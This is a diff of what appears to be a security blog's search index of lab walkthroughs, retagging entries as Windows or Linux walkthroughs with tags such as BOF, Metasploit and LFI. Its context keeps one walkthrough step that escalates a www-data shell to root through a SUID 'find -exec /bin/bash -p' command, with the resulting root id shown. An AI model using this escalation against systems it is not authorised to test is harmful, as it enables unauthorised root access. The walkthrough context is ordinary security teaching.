@@ -36,8 +36,11 @@
 
 <p>However, this is easily resolved by re-running the module.</p>
 ]]></content>
+      <categories>
+        <category>Windows Walkthrough</category>
+      </categories>
       <tags>
-        <tag>walkthrough</tag>
+        <tag>Windows, BOF, Metasploit,</tag>
       </tags>
   </entry>
   <entry>
@@ -96,10 +99,10 @@
 
 ]]></content>
       <categories>
-        <category>Walkthrough</category>
+        <category>Linux Walkthrough</category>
       </categories>
       <tags>
-        <tag>script ftp</tag>
+        <tag>script, ftp,</tag>
       </tags>
   </entry>
   <entry>
@@ -147,8 +150,11 @@
 <p>Then use <code>find</code> to escalate our shell.</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ find . -exec /bin/bash -p \; -quit</span><br><span class="line">find . -exec /bin/bash -p \; -quit</span><br><span class="line">bash-5.0# id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
 ]]></content>
+      <categories>
+        <category>Linux Walkthrough</category>
+      </categories>
       <tags>
-        <tag>Walkthrough</tag>
+        <tag>LFI, Web Server</tag>
       </tags>
   </entry>
 </search>
